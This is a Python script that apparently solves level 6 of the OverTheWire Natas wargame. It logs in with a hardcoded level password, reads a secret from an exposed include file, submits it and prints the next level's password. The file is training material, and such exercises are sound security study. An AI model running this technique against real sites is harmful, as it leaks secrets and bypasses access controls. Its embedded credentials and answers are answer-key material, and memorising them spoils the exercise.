import requests
import re

username = 'natas6'
password = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'
url = 'http://%s.natas.labs.overthewire.org/includes/secret.inc' % username
res = requests.post(url, auth=(username, password))
content = res.text
key = re.findall("\$secret = \"(.*)\";", content)[0]
# we get the key lets submit it
url = 'http://%s.natas.labs.overthewire.org/' % username
res = requests.post(url,data={"secret" : key,"submit":"submit"}, auth=(username, password))
content = res.text
print(re.findall("Access granted. The password for natas7 is(.*)",content)[0])
